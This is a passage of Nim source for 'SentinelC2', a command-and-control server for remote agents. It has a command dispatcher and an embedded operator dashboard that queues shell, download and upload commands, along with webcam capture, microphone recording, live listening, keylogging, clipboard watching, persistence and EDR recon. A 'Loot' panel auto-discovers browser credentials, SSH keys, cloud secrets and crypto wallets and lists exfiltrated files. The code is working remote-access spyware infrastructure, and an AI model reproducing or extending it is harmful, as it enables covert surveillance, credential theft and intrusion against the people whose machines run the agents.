      # mic <id> [seconds]  — seconds is optional, agent defaults to 10s
      if p.len < 2: return "Usage: " & p[0] & " <id> [seconds]\n"
      let argStr = if p.len >= 3: p[2] else: ""
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("mic", argStr))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "cam":
      # cam <id> [device]  — device is optional, agent defaults to 0
      if p.len < 2: return "Usage: " & p[0] & " <id> [device]\n"
      let argStr = if p.len >= 3: p[2] else: ""
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("cam", argStr))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "clipwatch":
      # clipwatch <id> [seconds]  — seconds is optional
      if p.len < 2: return "Usage: " & p[0] & " <id> [seconds]\n"
      let argStr = if p.len >= 3: p[2] else: ""
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("clipwatch", argStr))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "find":
      if p.len < 3: return "Usage: " & p[0] & " <id> <path>;<mask>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("find", p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    else:  # shell / download
      if p.len < 3: return "Usage: " & p[0] & " <id> <args>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd, p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
  of "upload", "up":
    if p.len < 3: return "Usage: " & p[0] & " <id> <remotepath> <base64>\n"
    # args are: <id> <remotepath> <base64-chunk>
    let sp = p[2].split(" ", maxsplit=1)
    if sp.len < 2: return "Usage: " & p[0] & " <id> <remotepath> <base64>\n"
    withLock agentsLock:
      if p[1] in agents:
        agents[p[1]].cmdQueue.add(
          %* {"cmd": "upload", "path": sp[0], "data": sp[1], "cid": nextCmdId})
        return "[" & BuildPrefix & " >] upload queued for " & p[1]
      return "[!] not found: " & p[1]
  else: return "Unknown: " & p[0] & " (try 'help')\n"

proc processCli() {.async.} =
  while true:
    let r = cliCh.tryRecv()
    if r.dataAvailable:
      let line = r.msg
      if line == "__stdin_closed__": break
      let outp = dispatch(line)
      if outp.len > 0: stdout.write(outp); stdout.flushFile()
    await sleepAsync(50)

# ------------------------------------------------------------
# WEB DASHBOARD (embedded HTTP server, port WEB_PORT)
# ------------------------------------------------------------
# Serves a single-page dashboard on WEB_PORT. The dashboard polls
# /api/agents for the live agent list and /api/log/<id>?since=N to
# tail the per-agent log file. Commands are dispatched via POST
# /api/cmd and operator can browse /downloads/* for exfiltrated files.
#
# Design: deliberately simple. No auth (use firewall / tailnet ACL).
# State lives in the same agents table the CLI uses. The web server
# is started alongside the CLI in main().
# ------------------------------------------------------------

var bootTime* = now()

const DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SentinelC2 - Operator Dashboard</title>
<style>
  :root {
    --bg-0: #0a0e14; --bg-1: #0d1117; --bg-2: #161b22; --bg-3: #1c2128;
    --bd: #30363d; --bd-2: #21262d;
    --fg: #c9d1d9; --fg-2: #8b949e; --fg-3: #6e7681;
    --blue: #58a6ff; --green: #3fb950; --red: #f85149;
    --purple: #d2a8ff; --yellow: #e3b341; --orange: #db6d28;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font: 13px/1.45 -apple-system, "Segoe UI", Consolas, monospace;
         background: var(--bg-0); color: var(--fg); height: 100vh;
         overflow: hidden; display: flex; flex-direction: column; }
  header { background: var(--bg-2); padding: 10px 18px;
           border-bottom: 1px solid var(--bd); display: flex;
           justify-content: space-between; align-items: center; height: 50px; }
  header .logo { display: flex; align-items: center; gap: 10px; }
  header h1 { font-size: 15px; color: var(--blue); font-weight: 600;
              letter-spacing: 0.5px; }
  header .logo svg { width: 20px; height: 20px; }
  .conn-badge { font-size: 11px; padding: 3px 10px; border-radius: 12px;
                font-weight: 600; display: inline-flex; align-items: center; gap: 5px; }
  .conn-badge .dot { width: 7px; height: 7px; border-radius: 50%; }
  .conn-badge.ok { background: rgba(63,185,80,0.15); color: var(--green); }
  .conn-badge.ok .dot { background: var(--green); box-shadow: 0 0 6px var(--green); }
  .conn-badge.bad { background: rgba(248,81,73,0.15); color: var(--red); }
  .conn-badge.bad .dot { background: var(--red); }
  .conn-badge.partial { background: rgba(227,179,65,0.15); color: var(--yellow); }
  .conn-badge.partial .dot { background: var(--yellow); }
  .srv-meta { font-size: 11px; color: var(--fg-3); }
  main { display: grid; grid-template-columns: 240px minmax(420px, 1fr) 280px;
         flex: 1; overflow: hidden; min-height: 0; }
  @media (max-width: 1100px) {
    main { grid-template-columns: 200px 1fr 240px; }
  }
  @media (max-width: 850px) {
    main { grid-template-columns: 180px 1fr; }
    main .right { display: none; }
  }
  .sidebar { background: var(--bg-1); border-right: 1px solid var(--bd);
             display: flex; flex-direction: column; overflow: hidden; }
  .sidebar-header { padding: 14px 16px 10px; border-bottom: 1px solid var(--bd-2);
                    display: flex; justify-content: space-between; align-items: center; }
  .sidebar-header h2 { font-size: 11px; text-transform: uppercase;
                       color: var(--fg-3); letter-spacing: 1px; font-weight: 600; }
  .agent-count-badge { font-size: 11px; background: var(--bd-2); color: var(--blue);
                       padding: 2px 8px; border-radius: 10px; font-weight: 600; }
  .agent-list { flex: 1; overflow-y: auto; }
  .agent { padding: 12px 16px; cursor: pointer; border: 1px solid var(--bd-2);
           margin: 6px 8px; border-radius: 8px; background: var(--bg-2);
           transition: all 0.15s; position: relative; }
  .agent:hover { background: var(--bg-3); border-color: var(--bd); }
  .agent.active { background: linear-gradient(135deg, rgba(88,166,255,0.12), rgba(88,166,255,0.04));
                  border-color: var(--blue); }
  .agent.active::before { content: ''; position: absolute; left: -2px; top: -1px; bottom: -1px;
                          width: 3px; background: var(--blue); border-radius: 2px; }
  .agent .agent-id { color: var(--blue); font-weight: 700; font-size: 12px;
                     display: flex; align-items: center; justify-content: space-between; }
  .agent .priv-badge { font-size: 9px; padding: 2px 6px; border-radius: 4px;
                       font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px; }
  .priv-badge.admin { background: rgba(248,81,73,0.2); color: var(--red); border: 1px solid rgba(248,81,73,0.4); }
  .priv-badge.user { background: rgba(110,118,129,0.2); color: var(--fg-3); border: 1px solid rgba(110,118,129,0.4); }
  .agent .agent-host { color: var(--fg); font-size: 12px; margin-top: 4px; }
  .agent .agent-meta { color: var(--fg-3); font-size: 10px; margin-top: 3px; }
  .agent .agent-uptime { color: var(--green); font-size: 10px; margin-top: 2px; float: right; }
  .agent .agent-geo { color: var(--blue); font-size: 10px; margin-top: 2px;
                       font-family: var(--mono); }
  .agent .agent-geo .country-flag { color: var(--orange); margin-right: 3px; }
  .sidebar-footer { padding: 8px 16px; border-top: 1px solid var(--bd-2);
                    font-size: 10px; color: var(--fg-3); text-align: center; }
  .empty-state { color: var(--fg-3); text-align: center; padding: 40px 20px; font-size: 12px; }
  .center { display: flex; flex-direction: column; overflow: hidden; }
  .agent-header-bar { background: var(--bg-2); padding: 12px 16px;
                      border-bottom: 1px solid var(--bd); display: flex;
                      justify-content: space-between; align-items: center; }
  .agent-header-bar .title { font-size: 14px; font-weight: 600; }
  .agent-header-bar .info { font-size: 11px; color: var(--fg-3); margin-top: 2px; }
  .quick-actions { padding: 8px 12px; background: var(--bg-1);
                   border-bottom: 1px solid var(--bd); display: flex;
                   gap: 6px; flex-wrap: wrap; }
  .qa { background: var(--bd-2); color: var(--fg); border: 1px solid var(--bd);
        padding: 6px 10px; border-radius: 6px; cursor: pointer; font: inherit;
        font-size: 11px; font-weight: 500; display: inline-flex; align-items: center;
        gap: 4px; transition: all 0.12s; }
  .qa:hover { background: var(--bg-3); border-color: var(--blue); color: var(--blue); }
  .qa.danger { color: var(--red); }
  .qa.danger:hover { background: rgba(248,81,73,0.15); border-color: var(--red); }
  .qa.activating { background: rgba(227,179,65,0.15); border-color: var(--yellow); color: var(--yellow); }
  .cmd-bar { padding: 8px 12px; background: var(--bg-2); border-bottom: 1px solid var(--bd);
             display: flex; gap: 6px; align-items: center; }
  .cmd-bar select { background: var(--bg-1); color: var(--fg); border: 1px solid var(--bd);
                   padding: 7px 8px; font: inherit; border-radius: 6px; font-size: 12px; }
  .cmd-bar input { flex: 1; background: var(--bg-1); color: var(--fg);
                   border: 1px solid var(--bd); padding: 7px 10px;
                   font: inherit; border-radius: 6px; font-size: 12px; }
  .cmd-bar input:focus { outline: none; border-color: var(--blue);
                         box-shadow: 0 0 0 2px rgba(88,166,255,0.2); }
  .cmd-bar button { background: var(--green); color: #fff; border: none;
                    padding: 7px 16px; border-radius: 6px; cursor: pointer;
                    font: inherit; font-size: 12px; font-weight: 600; }
  .cmd-bar button:hover { background: #2ea043; }
  .cmd-bar button:disabled { background: var(--bd-2); color: var(--fg-3); cursor: not-allowed; }
  .log-wrap { flex: 1; overflow: hidden; position: relative; min-height: 0; }
  .log { height: 100%; overflow-y: auto; padding: 8px 14px;
         background: var(--bg-0); font-size: 12px;
         font-family: Consolas, "Cascadia Code", monospace; }
  .log .line { padding: 1px 0; white-space: pre-wrap; word-break: break-all; line-height: 1.5; }
  .log .ts { color: var(--fg-3); }
  .log .in, .log .out { color: var(--purple); }
  .log .info { color: var(--blue); }
  .log .err { color: var(--red); }
  .log .ok { color: var(--green); }
  .log .warn { color: var(--yellow); }
  .auto-scroll-paused { position: absolute; bottom: 12px; right: 16px;
                        background: var(--bg-2); color: var(--yellow);
                        padding: 4px 10px; border-radius: 12px; font-size: 10px;
                        display: none; border: 1px solid var(--bd); z-index: 10; }
  .right { background: var(--bg-1); border-left: 1px solid var(--bd);
           display: flex; flex-direction: column; overflow: hidden; }
  .right-section { border-bottom: 1px solid var(--bd-2); display: flex; flex-direction: column; }
  .right-section > h3 { font-size: 11px; text-transform: uppercase; color: var(--fg-3);
                        letter-spacing: 1px; padding: 12px 16px 8px; font-weight: 600;
                        background: var(--bg-2); border-bottom: 1px solid var(--bd-2); }
  .state-body { padding: 10px 16px; overflow-y: auto; }
  .state-body .row { display: flex; justify-content: space-between; padding: 4px 0;
                     font-size: 12px; border-bottom: 1px solid rgba(48,54,61,0.4); }
  .state-body .row .k { color: var(--fg-3); }
  .state-body .row .v { color: var(--fg); font-weight: 500; text-align: right; word-break: break-all; }
  .state-body .row.geo .k { color: var(--orange); }
  .state-body .row.geo .v { color: var(--blue); font-family: var(--mono); font-size: 10px; }
  .files-body { flex: 1; overflow-y: auto; padding: 8px 12px; }
  .file-item { padding: 8px 10px; border: 1px solid var(--bd-2); border-radius: 6px;
               margin-bottom: 6px; background: var(--bg-2); cursor: pointer;
               transition: all 0.12s; }
  .file-item:hover { background: var(--bg-3); border-color: var(--bd); }
  .file-item .fname { color: var(--blue); font-size: 11px; font-weight: 500; word-break: break-all; }
  .file-item .fmeta { color: var(--fg-3); font-size: 10px; margin-top: 3px; }
  .file-item .fmime { color: var(--green); }
  .loot-body { flex: 1; overflow-y: auto; padding: 8px 12px; max-height: 380px; }
  .loot-item { padding: 8px 10px; border: 1px solid var(--bd-2); border-radius: 6px;
               margin-bottom: 6px; background: var(--bg-2); transition: all 0.12s; }
  .loot-item.kind-browser { border-left: 3px solid var(--orange); }
  .loot-item.kind-ssh     { border-left: 3px solid var(--green); }
  .loot-item.kind-cloud   { border-left: 3px solid var(--blue); }
  .loot-item.kind-wallet  { border-left: 3px solid var(--red); }
  .loot-item.kind-recent  { border-left: 3px solid var(--fg-3); }
  .loot-item.kind-doc     { border-left: 3px solid #a78bfa; }
  .loot-item .lkind { font-size: 9px; text-transform: uppercase; letter-spacing: 1px;
                      color: var(--orange); font-weight: 600; }
  .loot-item .llabel { color: var(--fg); font-size: 11px; margin-top: 2px; word-break: break-all; }
  .loot-item .lpath { color: var(--fg-3); font-size: 10px; margin-top: 3px;
                      font-family: var(--mono); word-break: break-all; }
  .loot-item .lmeta { color: var(--fg-3); font-size: 10px; margin-top: 3px;
                      display: flex; justify-content: space-between; align-items: center; }
  .loot-item .lmeta .lsteal { color: var(--blue); cursor: pointer;
                              background: var(--bg-1); border: 1px solid var(--bd-2);
                              padding: 2px 6px; border-radius: 4px; font-size: 10px; }
  .loot-item .lmeta .lsteal:hover { background: var(--bd); border-color: var(--blue); }
  .loot-item .lpreview { color: var(--green); font-size: 9px; margin-top: 3px;
                         font-family: var(--mono); white-space: pre-wrap;
                         max-height: 60px; overflow: hidden;
                         background: rgba(0,0,0,0.3); padding: 4px; border-radius: 3px; }
  .preview-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85);
                     z-index: 1000; display: none; align-items: center;
                     justify-content: center; flex-direction: column; }
  .preview-overlay.active { display: flex; }
  .preview-overlay img { max-width: 90vw; max-height: 80vh; border-radius: 8px;
                          box-shadow: 0 0 40px rgba(88,166,255,0.3); }
  .preview-overlay audio { width: 400px; margin-top: 20px; }
  .preview-overlay .close { position: absolute; top: 16px; right: 24px;
                             color: var(--fg); font-size: 24px; cursor: pointer;
                             background: var(--bg-2); width: 38px; height: 38px;
                             border-radius: 50%; display: flex; align-items: center;
                             justify-content: center; border: 1px solid var(--bd); }
  .preview-overlay .name { color: var(--fg-2); font-size: 12px; margin-top: 12px; }
  .toasts { position: fixed; top: 60px; right: 16px; z-index: 999;
            display: flex; flex-direction: column; gap: 8px; max-width: 360px; }
  .toast { background: var(--bg-2); border: 1px solid var(--bd); border-left: 3px solid;
           padding: 10px 14px; border-radius: 8px; font-size: 12px;
           animation: slideIn 0.2s ease; display: flex; gap: 8px; align-items: start; }
  .toast.success { border-left-color: var(--green); }
  .toast.error { border-left-color: var(--red); }
  .toast.info { border-left-color: var(--blue); }
  .toast .ttitle { font-weight: 600; margin-bottom: 2px; }
  .toast .tbody { color: var(--fg-2); font-size: 11px; }
  @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
  .toast.fade-out { animation: fadeOut 0.3s ease forwards; }
  @keyframes fadeOut { to { opacity: 0; transform: translateX(20px); } }
  ::-webkit-scrollbar { width: 8px; height: 8px; }
  ::-webkit-scrollbar-track { background: var(--bg-0); }
  ::-webkit-scrollbar-thumb { background: var(--bd); border-radius: 4px; }
  ::-webkit-scrollbar-thumb:hover { background: var(--fg-3); }
  .center-empty { display: flex; flex: 1; align-items: center; justify-content: center;
                  color: var(--fg-3); font-size: 14px; }
</style>
</head>
<body>
<header>
  <div class="logo">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color: var(--blue);">
      <path d="M12 2L3 7v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V7l-9-5z"/>
      <path d="M12 2v20" /><path d="M3 7l9 5 9-5"/>
    </svg>
    <h1>SentinelC2</h1>
    <span class="conn-badge ok" id="ws-status"><span class="dot"></span> WS Live</span>
  </div>
  <div class="srv-meta">
    <span id="srv-uptime">-</span> &middot; <span id="srv-host">-</span> &middot;
    agents: <strong id="agent-count" style="color:var(--green)">0</strong>
  </div>
</header>
<main>
  <div class="sidebar">
    <div class="sidebar-header">
      <h2>Connected Agents</h2>
      <span class="agent-count-badge" id="agent-count-badge">0</span>
    </div>
    <div class="agent-list" id="agent-list">
      <div class="empty-state">no agents connected</div>
    </div>
    <div class="sidebar-footer">auto-refresh via WebSocket</div>
  </div>
  <div class="center">
    <div id="center-content" style="display:none; flex:1; flex-direction:column; overflow:hidden;">
      <div class="agent-header-bar">
        <div>
          <div class="title" id="sel-agent-id">-</div>
          <div class="info" id="sel-agent-info">-</div>
        </div>
      </div>
      <div class="quick-actions" id="quick-actions">
        <button class="qa" onclick="qa('screenshot')">Screenshot</button>
        <button class="qa" onclick="qa('clip')">Clipboard</button>
        <button class="qa" onclick="qa('ps')">Processes</button>
        <button class="qa" onclick="qa('recon','edr')">Recon EDR</button>
        <button class="qa" onclick="qa('cam')">Webcam</button>
        <button class="qa" onclick="qa('mic','','10')">Mic 10s</button>
        <button class="qa" id="qa-listen" onclick="qaToggle('listen')">Live Listen</button>
        <button class="qa" id="qa-clipwatch" onclick="qaToggle('clipwatch')">Clip Watch</button>
        <button class="qa" id="qa-keys" onclick="qaToggle('keys')">Keylog</button>
        <button class="qa" onclick="qa('find')">Find Files</button>
        <button class="qa" onclick="qa('persist')">Persist</button>
        <button class="qa danger" onclick="qa('kill')">Kill</button>
        <button class="qa danger" onclick="qa('panic')">Panic</button>
      </div>
      <div class="cmd-bar">
        <select id="cmd-kind">
          <option>shell</option><option>recon</option><option>exfil</option>
          <option>ps</option><option>clip</option><option>screenshot</option>
          <option>cam</option><option>mic</option><option>clipwatch</option>
          <option>listen</option><option>find</option><option>persist</option>
          <option>kill</option><option>panic</option><option>keys</option>
          <option>autodrive</option>
          <option>unlisten</option><option>unclipwatch</option>
        </select>
        <input type="text" id="cmd-input" placeholder="args, e.g. whoami / edr / wifi / 30 ..." autocomplete="off">
        <button onclick="sendCmd()" id="cmd-send">Run</button>
      </div>
      <div class="log-wrap">
        <div class="log" id="log"></div>
        <div class="auto-scroll-paused" id="scroll-paused">autoscroll paused (hover)</div>
      </div>
    </div>
    <div class="center-empty" id="center-empty">select an agent to begin</div>
  </div>
  <div class="right">
    <div class="right-section">
      <h3>Agent State</h3>
      <div class="state-body" id="state-body"><div class="empty-state">-</div></div>
    </div>
    <div class="right-section" style="flex:1; min-height:0;">
      <h3>Files <span id="file-count" style="color:var(--blue); float:right; font-size:10px;">0</span>
        <span style="float:right; margin-left:8px;">
          <button class="qa" id="btn-upload" onclick="window.uploadFile()" style="font-size:9px; padding:2px 6px;">Upload</button>
          <input type="file" id="upload-input" style="display:none;" />
        </span>
      </h3>
      <div class="files-body" id="files-body"><div class="empty-state">no files</div></div>
    </div>
    <div class="right-section" style="flex:1; min-height:0;">
      <h3>Loot <span id="loot-count" style="color:var(--orange); float:right; font-size:10px;">0</span>
        <span style="float:right; margin-left:8px;">
          <button class="qa" id="qa-autodrive" onclick="qaToggle('autodrive')" style="font-size:9px; padding:2px 6px;">Auto-Drive</button>
        </span>
      </h3>
      <div class="loot-body" id="loot-body"><div class="empty-state">enable auto-drive to discover credentials / wallet / ssh / cloud / docs on this host</div></div>
    </div>
  </div>
</main>
<div class="toasts" id="toasts"></div>
<div class="preview-overlay" id="preview-overlay" onclick="closePreview(event)">
  <span class="close" onclick="closePreview()">X</span>
  <div id="preview-content"></div>
  <div class="name" id="preview-name"></div>
</div>
<script>
// Strip credentials from URL on first load. When the operator hits
// `http://user:pass@host/`, Chromium serves the page (Basic auth
// succeeds) but subsequent fetch() calls reject URLs that contain
// userinfo (even relative ones resolved from a credentialed
// document URL). We already have the session cookie from Set-Cookie
// — replace the URL with a credential-free version and reload. The
// session cookie carries auth forward on the redirect.
(function stripCreds() {
  try {
    if (location.href.indexOf('@') > location.protocol.length + 4) {
      var clean = location.protocol + '//' + location.host + location.pathname + location.search + location.hash;
      // Defer to next tick so Set-Cookie is fully processed by the
      // browser before we navigate away.
      setTimeout(function() { location.replace(clean); }, 50);
    }
  } catch(e) {}
})();
(function() {
  "use strict";
  let activeId = null;
  let agents = [];
  let wsAgents = null;
  let wsLog = null;
  let wsReconnectAgents = null;
  let wsReconnectLog = null;
  let logAutoScroll = true;
  let cmdHistory = [];
  let cmdHistoryIdx = -1;
  let activeToggles = {};

  const $ = id => document.getElementById(id);
  function esc(s) {
    return String(s||'').replace(/[&<>"']/g, c =>
      ({ '&':'&','<':'<','>':'>','"':'"',"'":'&#39;' })[c]);
  }
  function fmtSize(b) {
    if (b < 1024) return b + ' B';
    if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
    if (b < 1073741824) return (b/1048576).toFixed(1) + ' MB';
    return (b/1073741824).toFixed(2) + ' GB';
  }
  function fmtTime(unix) {
    if (!unix) return '';
    return new Date(unix * 1000).toLocaleTimeString();
  }

  function toast(title, body, type, timeout) {
    type = type || 'info'; timeout = timeout || 4000;
    var c = $('toasts');
    var t = document.createElement('div');
    t.className = 'toast ' + type;
    t.innerHTML = '<div><div class="ttitle">' + esc(title) + '</div>' +
      (body ? '<div class="tbody">' + esc(body) + '</div>' : '') + '</div>';
    c.appendChild(t);
    setTimeout(function() {
      t.classList.add('fade-out');
      setTimeout(function() { t.remove(); }, 300);
    }, timeout);
  }

  function connectAgentsWS() {
    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    try {
      // WebSocket is served on a dedicated port (8081 by default)
      // via a raw socket listener, not asynchttpserver.
      var wsHost = location.hostname + ':8081';
      wsAgents = new WebSocket(proto + '//' + wsHost + '/agents');
    } catch(e) { scheduleReconnectAgents(); return; }
    wsAgents.onopen = function() { updateConnBadge(); };
    wsAgents.onmessage = function(ev) {
      try {
        var msg = JSON.parse(ev.data);
        if (msg.type === 'hello' || msg.type === 'agents') {
          agents = msg.agents || [];
          renderAgents();
          updateServerMeta(msg.uptime_s);
          // Auto-select first agent if none selected (UX: operator lands
          // on dashboard and immediately sees agent details).
          if (!activeId && agents.length > 0) {
            selectAgent(agents[0].id);
          }
          // If the active agent disappeared (disconnected), switch to
          // the next available one or clear the selection.
          if (activeId && agents.length > 0) {
            var stillHere = agents.some(function(a) { return a.id === activeId; });
            if (!stillHere) selectAgent(agents[0].id);
          }
          // If the active agent just got geo enrichment resolved,
          // re-fetch its state so the right pane updates immediately.
          if (activeId) {
            var me = agents.find(function(a) { return a.id === activeId; });
            if (me && me.geo && me.geo.country && me.geo.country !== '?') {
              // Only re-fetch if the right pane doesn't already have
              // geo data for this agent (cheap heuristic: check for
              // the geo row class we render).
              if (!$('state-body').querySelector('.row.geo')) {
                fetchState(activeId);
              }
            }
          }
        }
      } catch(e) {}
    };
    wsAgents.onclose = function() { updateConnBadge(); scheduleReconnectAgents(); };
    wsAgents.onerror = function() { updateConnBadge(); };
  }
  function scheduleReconnectAgents() {
    if (wsReconnectAgents) clearTimeout(wsReconnectAgents);
    wsReconnectAgents = setTimeout(connectAgentsWS, 2000);
  }

  function connectLogWS(id) {
    if (wsLog) { try { wsLog.close(); } catch(e){} wsLog = null; }
    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    try {
      // WebSocket is served on a dedicated port (8081 by default)
      // via a raw socket listener, not asynchttpserver.
      var wsHost = location.hostname + ':8081';
      wsLog = new WebSocket(proto + '//' + wsHost + '/log/' + id);
    } catch(e) { return; }
    wsLog.onopen = function() { updateConnBadge(); };
    wsLog.onmessage = function(ev) {
      try {
        var msg = JSON.parse(ev.data);
        if (msg.type === 'loot') {
          addLootItem(msg);
          appendLogLine('[' + new Date().toISOString().substring(11,19) +
                        '] [loot] ' + msg.kind + ': ' + (msg.label || msg.path));
          return;
        }
        if (msg.type === 'hello') return;  // ignore WS open greeting
      } catch(e) { appendLogLine(ev.data); return; }
      appendLogLine(ev.data);
    };
    wsLog.onclose = function() {
      updateConnBadge();
      if (activeId === id) {
        if (wsReconnectLog) clearTimeout(wsReconnectLog);
        wsReconnectLog = setTimeout(function() { if (activeId === id) connectLogWS(id); }, 2000);
      }
    };
    wsLog.onerror = function() {};
  }

  function updateConnBadge() {
    var badge = $('ws-status');
    var aOk = wsAgents && wsAgents.readyState === 1;
    var lOk = wsLog && wsLog.readyState === 1;
    if (aOk && (lOk || !activeId)) {
      badge.className = 'conn-badge ok'; badge.innerHTML = '<span class="dot"></span> WS Live';
    } else if (aOk || lOk) {
      badge.className = 'conn-badge partial'; badge.innerHTML = '<span class="dot"></span> Partial';
    } else {
      badge.className = 'conn-badge bad'; badge.innerHTML = '<span class="dot"></span> Offline';
    }
  }

  function updateServerMeta(uptimeS) {
    if (uptimeS !== undefined) {
      var h = Math.floor(uptimeS / 3600);
      var m = Math.floor((uptimeS % 3600) / 60);
      var s = Math.floor(uptimeS % 60);
      $('srv-uptime').textContent = 'up ' + (h>0? h+'h ' : '') + (m>0? m+'m ' : '') + s + 's';
    }
  }

  function fmtGeo(geo, ip) {
    // Build a one-line geo summary for the sidebar card. If geo is
    // missing or just "?" (lookup pending), show ip + "geo resolving…".
    if (!geo || (geo.country === '?' && !geo.city)) {
      return '<span class="country-flag">⌖</span>' + esc(ip || '?') + ' <span style="color:var(--fg-3)">(resolving)</span>';
    }
    if (geo.country === 'private') {
      return '<span class="country-flag">⌖</span>' + esc(ip || '?') + ' <span style="color:var(--fg-3)">LAN</span>';
    }
    var parts = [];
    if (geo.country && geo.country !== '?') parts.push(geo.country);
    if (geo.city && geo.city !== '?') parts.push(geo.city);
    return '<span class="country-flag">⌖</span>' + esc(ip || '?') +
           (parts.length ? ' \u00b7 ' + esc(parts.join(', ')) : '');
  }

  function renderAgents() {
    var list = $('agent-list');
    $('agent-count').textContent = agents.length;
    $('agent-count-badge').textContent = agents.length;
    if (!agents.length) {
      list.innerHTML = '<div class="empty-state">no agents connected</div>';
      return;
    }
    list.innerHTML = agents.map(function(a) {
      return '<div class="agent ' + (a.id === activeId ? 'active' : '') +
        '" onclick="selectAgent(\'' + esc(a.id) + '\')">' +
        '<div class="agent-id"><span>' + esc(a.id) + '</span>' +
        '<span class="priv-badge ' + (a.privileges==='admin'?'admin':'user') + '">' +
        esc(a.privileges||'user') + '</span></div>' +
        '<div class="agent-host">' + esc(a.hostname) + ' / ' + esc(a.username) + '</div>' +
        '<div class="agent-meta">' + esc(a.os) + '</div>' +
        '<div class="agent-uptime">up ' + esc(a.uptime) + '</div>' +
        '<div class="agent-geo">' + fmtGeo(a.geo, a.remote) + '</div></div>';
    }).join('');
  }

  window.selectAgent = function(id) {
    activeId = id;
    $('center-empty').style.display = 'none';
    $('center-content').style.display = 'flex';
    renderAgents();
    fetchState(id);
    connectLogWS(id);
    $('log').innerHTML = '';
    fetchLoot(id);
    updateConnBadge();
  };

  async function fetchState(id) {
    try {
      var r = await fetch('/api/state/' + encodeURIComponent(id));
      var data = await r.json();
      if (data.error) { toast('State error', data.error, 'error'); return; }
      $('sel-agent-id').textContent = data.id;
      $('sel-agent-info').textContent =
        esc(data.hostname) + ' / ' + esc(data.username) + ' - ' + esc(data.os) +
        ' (' + esc(data.privileges) + ') - up ' + esc(data.uptime);
      // Build geo rows. If geo is missing or "?", show a "resolving…"
      // placeholder so the operator knows the lookup is in flight.
      var geoBlock = '';
      if (data.geo && data.geo.country && data.geo.country !== '?') {
        var g = data.geo;
        if (g.country === 'private') {
          geoBlock = '<div class="row geo"><span class="k">source</span><span class="v">' +
            esc(g.addr) + ' (LAN)</span></div>';
        } else {
          var loc = [g.city, g.region, g.country].filter(function(x) { return x && x !== '?'; }).join(', ');
          geoBlock =
            '<div class="row geo"><span class="k">source IP</span><span class="v">' + esc(g.addr) + '</span></div>' +
            '<div class="row geo"><span class="k">location</span><span class="v">' + esc(loc) + '</span></div>' +
            (g.isp && g.isp !== '?' ? '<div class="row geo"><span class="k">ISP</span><span class="v">' + esc(g.isp) + '</span></div>' : '') +
            (g.org && g.org !== '?' && g.org !== g.isp ? '<div class="row geo"><span class="k">org</span><span class="v">' + esc(g.org) + '</span></div>' : '') +
            (g.timezone && g.timezone !== '?' ? '<div class="row geo"><span class="k">timezone</span><span class="v">' + esc(g.timezone) + '</span></div>' : '');
        }
      } else if (data.remote) {
        geoBlock = '<div class="row geo"><span class="k">source IP</span><span class="v">' +
          esc(data.remote) + ' <span style="color:var(--fg-3)">(resolving)</span></span></div>';
      }
      $('state-body').innerHTML =
        '<div class="row"><span class="k">hostname</span><span class="v">' + esc(data.hostname) + '</span></div>' +
        '<div class="row"><span class="k">username</span><span class="v">' + esc(data.username) + '</span></div>' +
        '<div class="row"><span class="k">OS</span><span class="v">' + esc(data.os) + '</span></div>' +
        '<div class="row"><span class="k">privileges</span><span class="v">' + esc(data.privileges) + '</span></div>' +
        '<div class="row"><span class="k">uptime</span><span class="v">' + esc(data.uptime) + '</span></div>' +
        '<div class="row"><span class="k">log size</span><span class="v">' + fmtSize(data.log_size||0) + '</span></div>' +
        geoBlock;
      renderFiles(id, data.files || []);
      var lr = await fetch('/api/log/' + encodeURIComponent(id));
      var ld = await lr.json();
      if (ld.text) {
        var lines = ld.text.split('\\n');
        for (var i = 0; i < lines.length; i++) {
          if (lines[i]) appendLogLine(lines[i]);
        }
      }
    } catch(e) {
      // Visible debug: show error in state body so we can diagnose
      $('state-body').innerHTML =
        '<div class="row"><span class="k">fetch error</span><span class="v">' + esc(e.message || String(e)) + '</span></div>';
      toast('Fetch failed', e.message, 'error');
    }
  }

  function renderFiles(id, files) {
    var fb = $('files-body');
    $('file-count').textContent = files.length;
    if (!files.length) {
      fb.innerHTML = '<div class="empty-state">no files</div>';
      return;
    }
    files.sort(function(a,b) { return (b.mtime||0) - (a.mtime||0); });
    fb.innerHTML = files.map(function(f) {
      return '<div class="file-item" onclick="previewFile(\'' + esc(id) + '\',\'' +
        esc(f.name) + '\',\'' + esc(f.mime||'') + '\')">' +
        '<div class="fname">' + esc(f.name) + '</div>' +
        '<div class="fmeta">' + fmtSize(f.size||0) + ' &middot; <span class="fmime">' +
        esc(f.mime||'') + '</span> &middot; ' + fmtTime(f.mtime) + '</div></div>';
    }).join('');
  }

  window.previewFile = function(id, name, mime) {
    var url = '/downloads/' + encodeURIComponent(id) + '/' + encodeURIComponent(name);
    var content = $('preview-content');
    $('preview-name').textContent = name;
    if (mime && mime.indexOf('image/') === 0) {
      content.innerHTML = '<img src="' + url + '" alt="' + esc(name) + '">';
    } else if (mime && mime.indexOf('audio/') === 0) {
